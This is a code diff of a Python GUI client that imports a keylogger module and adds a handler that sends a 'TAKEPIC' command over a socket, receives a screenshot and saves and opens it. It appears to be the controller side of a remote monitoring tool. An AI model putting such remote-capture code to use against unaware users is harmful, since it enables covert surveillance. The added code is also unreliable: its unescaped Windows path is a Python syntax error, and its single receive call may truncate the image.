@@ -12,6 +12,8 @@ import Keylog
 import whois
 import Program
 import subprocess
+import os
+import sys
 
 img_bytes = b'\x00\x01\x02...'
 
@@ -363,34 +365,43 @@ class GUI:
 
     def butTake_click(self):
         #try:
-        #self.client.sendall(b"TAKEPIC")
-            # img_bytes = self.client.recv(4096)
+        self.client.sendall(b"TAKEPIC")
+        img_size = int.from_bytes(self.client.recv(4), 'big')
+        img_data = self.client.recv(img_size)
+        with open('C:\Users\Admin\Desktop\screenshot.png', 'wb') as f:
+            f.write(img_data)
+        os.startfile('C:\Users\Admin\Desktop\screenshot.png')
 
-            # Display screenshot in a new tab
-            # new_tab = ttk.Frame(self.tabs)
-            # tab_label = tk.Label(new_tab)
-            # tab_pil_img = Image.open(io.BytesIO(img_bytes))
-            # tab_img = ImageTk.PhotoImage(tab_pil_img)
-            # tab_label.config(image=tab_img)
-            # tab_label.image = tab_img
-            # tab_label.pack()
+        #     #Display screenshot in a new tab
+        #     new_tab = ttk.Frame(self.tabs)
+        #     tab_label = tk.Label(new_tab)
+        #     tab_pil_img = Image.open(io.BytesIO(img_bytes))
+        #     tab_img = ImageTk.PhotoImage(tab_pil_img)
+        #     tab_label.config(image=tab_img)
+        #     tab_label.image = tab_img
+        #     tab_label.pack()
 
-            # save_btn = ttk.Button(
-            #     new_tab, text="Save", command=lambda: self.buttonSAVE_click(img_bytes))
-            # save_btn.pack()
+        #     save_btn = ttk.Button(
+        #         new_tab, text="Save", command=lambda: self.buttonSAVE_click(img_bytes))
+        #     save_btn.pack()
 
-            # self.tabs.add(new_tab, text="Screenshot")      
-        #except Exception as ex:
-            #messagebox.showerror("Error", str(ex))
-        while True:
-            succesful_screenshot = self.client.recv(4096).decode(encoding="utf-8")
-            if succesful_screenshot == "returnedScreenshot":
-                self.client.settimeout(5.0)
-                screenshot = self.client.recv(4096)
+        #     self.tabs.add(new_tab, text="Screenshot")      
+        # except Exception as ex:
+        #     messagebox.showerror("Error", str(ex))
 
-                img = Image.frombytes(data=screenshot, size=(500, 500), mode="RGB")
-                img.show()
+        # while True:
+        #     # Receive our data and check what to do with it.
+        #     succesful_screenshot = self.recv(4096).decode(encoding="utf-8")
+        #     if succesful_screenshot == "returnedScreenshot":
+        #         self.settimeout(5.0)
+        #         screenshot = b""
+        #         chunk = self.recv(4096)
+        #         while chunk:
+        #             screenshot += chunk
+        #             chunk = self.recv(4096)
 
+        #         img = Image.frombytes(data=screenshot, size=(500, 500), mode="RGB")
+        #         img.show()
 
     def buttonSAVE_click(self, img_bytes):
         # Show the save file dialog
